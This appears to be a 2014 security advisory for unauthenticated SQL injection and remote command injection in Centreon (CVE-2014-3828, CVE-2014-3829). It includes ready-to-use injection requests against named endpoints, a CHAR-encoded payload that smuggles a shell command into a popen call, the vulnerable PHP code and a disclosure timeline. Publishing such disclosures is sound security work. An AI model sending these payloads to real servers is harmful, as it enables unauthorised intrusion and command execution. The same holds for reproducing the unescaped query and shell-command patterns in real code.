@@ -1,0 +1,189 @@
+id: 22770
+date: 10/18/2014
+title: Centreon SQL Injection / Command Injection Vulnerability
+author: MaZ
+cves: CVE-2014-3828, CVE-2014-3829
+
+# Multiple unauthenticated SQL injections and unauthenticated remote 
+command injection in Centreon <= 2.5.2 and Centreon Enterprise Server <= 
+2.2|3.0
+#
+# Product link:     http://www.centreon.com/
+# CVE references
+#  |- CVE-2014-3828:  Unauthenticated SQL injections
+#  |- CVE-2014-3829:  Unauthenticated remote command injection
+# CERT/CC reference:  VU#298796
+# Author:         MaZ
+
+TL;DR
+-----
+Centreon is vulnerable to several pre-auth SQLi and a cool pre-auth rci: 
+the only prerequisites to exploit the rci is to have at least one user 
+(you, your fav sysadmin or someone else) connected to the WebUI.
+All Centreon versions from 2008 (v2.0) are vulnerable to the rci. Vulns 
+were originally found for the 2.5.1 version but the 2.5.2 seems to be 
+still vulnerable.
+See the quick'n'dirty PoC below. A msf module might be soon be 
+available.
+
+
+PoC
+---
+> SQL injections:
+------------------
+[POST] 
+http://server/centreon/include/configuration/configObject/traps/GetXMLTrapsForVendor.php
+[POST DATA] mnftr_id=1 or 1=1 union all select version(),2 -- /**
+
+[POST] 
+http://server/centreon/include/common/javascript/commandGetArgs/cmdGetExample.php
+[POST DATA] index=2' or 1=1 -- /**
+
+[GET] http://server/centreon/include/views/graphs/GetXmlTree.php?sid=' 
+or 1=1 -- /**
+
+[GET] 
+http://server/centreon/include/views/graphs/graphStatus/displayServiceStatus.php?session_id=0' 
+or 1=1 -- /**&index=1' or 1=1 -- /**
+
+[GET] 
+http://server/centreon/include/views/graphs/common/makeXML_ListMetrics.php?index_id=' 
+union select @@version,2,3 -- /**
+
+> Remote Command Injection
+---------------------------
+For older versions, the URL is not: 
+http://server/centreon/include/views/graphs/graphStatus/displayServiceStatus.php
+but: 
+http://server/centreon/include/views/graphs/statusGraphs/displayServiceStatus.php.
+
+[PAYLOAD] ";uname -a;" which has to be converted to SQL "CHAR(59, 32, 
+117, 110, 97, 109, 101, 32, 45, 97, 59)"
+
+[GET] 
+http://server/centreon/include/views/graphs/graphStatus/displayServiceStatus.php
+?session_id=' or 1=1 -- /**
+&template_id=' UNION ALL SELECT 1,2,3,4,5,CHAR(59, 32, 117, 110, 97, 
+109, 101, 32, 45, 97, 
+59),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 -- /**
+
+
+Details
+-------
+> SQLi injections:
+------------------
+See for yourself
+$ cd www/
+$ grep -inr "DB->query(" . |grep -P "$_(GET|POST)"
+
+> Remote Command Injection
+---------------------------
+The following world-accessible file 
+"www/include/views/graphs/graphStatus/displayServiceStatus.php" contains 
+few coding mistakes.
+The purpose of this script is to produce a graph, relying on the 
+execution of a shell command involving the "graph" executable: a 
+mis-escaped shell command is built throughout the script.
+
+Well first, there's an SQLi in the request which checks for an active 
+session (someone has to be currently logged). From line 70 :
+  /*
+   * Verify if session is active
+   */
+
+  $session = $pearDB->query("SELECT * FROM `session` WHERE session_id = 
+'".$_GET["session_id"]."'");
+
+
+Then, some graph parameters are taken from a template id. The associated 
+request is also vulnerable to SQLi.
+ From line 120 you have the code responsible for setting the variable 
+$template_id :
+  if (!isset($_GET["template_id"])|| !$_GET["template_id"]){
+    $host_id = getMyHostID($index_data_ODS["host_name"]);
+    $svc_id = getMyServiceID($index_data_ODS["service_description"], 
+$host_id);
+    $template_id = getDefaultGraph($svc_id, 1);
+    $index = $index_data_ODS["id"];
+  } else
+    $template_id = $_GET["template_id"];
+
+
+Then, there's an SQLi in the request which gets there graph parameters.
+ From line 140:
+  /*
+   * get all template infos
+   */
+
+  $DBRESULT = $pearDB->query("SELECT * FROM giv_graphs_template WHERE 
+graph_id = '".$template_id."' LIMIT 1");
+  $GraphTemplate = $DBRESULT->fetchRow();
+
+
+Then, these graph parameters are put into the command. Notably the 
+"base" parameter, corresponding to the 6th column in the 
+'giv_graphs_template' table.
+ From line 163:
+  $base = "";
+  if (isset($GraphTemplate["base"]) && $GraphTemplate["base"])
+  {
+    $base = "-b ".$GraphTemplate["base"];
+  }
+
+At line 184:
+  $command_line .= " --interlaced $base --imgformat PNG 
+--width=".$GraphTemplate["width"]." 
+--height=".$GraphTemplate["height"]." ";
+
+
+Then, the command line is escaped...but some special chars, notably ';', 
+are missed:
+ From line 254:
+  /*
+   * Escale special char
+   */
+  $command_line = escape_command("$command_line");
+
+ From line 38:
+  function escape_command($command) {
+    return preg_replace("/(\\\$|`)/", "", $command);
+  }
+
+
+Finally and to top it all, the command gets executed and the stdout is 
+echoed.
+ From line 259:
+  $fp = popen($command_line  , 'r');
+  if (isset($fp) && $fp ) {
+    $str ='';
+    while (!feof ($fp)) {
+      $buffer = fgets($fp, 4096);
+      $str = $str . $buffer ;
+    }
+    print $str;
+  }
+
+
+Solution
+--------
+Brace yourself and
+* Delete displayServiceStatus.php: I don't know if it'll break something 
+or not
+* Wait for patches
+
+
+Timeline
+--------
+Jun  3, 2014: Discoverer found vulns, asked for CVE and contacted vendor 
+through their contact@ and sales@ mail. Not a single f*** seems to be 
+given from them
+Jun 21, 2014: Discoverer contacted Rapid7. Yes, they're cool
+Aug 04, 2014: Rapid7 validated CVE-2014-3289
+Aug 11, 2014: Rapid7 validated CVE-2014-3828
+Aug 28, 2014: Researcher and Rapid7 agree to disclose to CERT/CC.
+Sep  2, 2014: Disclosure to CERT/CC. They'll try to reach the vendor. 
+Public disclosure date is set on October 15, 2014
+Oct 16, 2014: No fix or news from Centreon. Not a single f*** is 
+definitely given. Public disclosure. Period
+
+#  0day.today [2023-03-24]  #
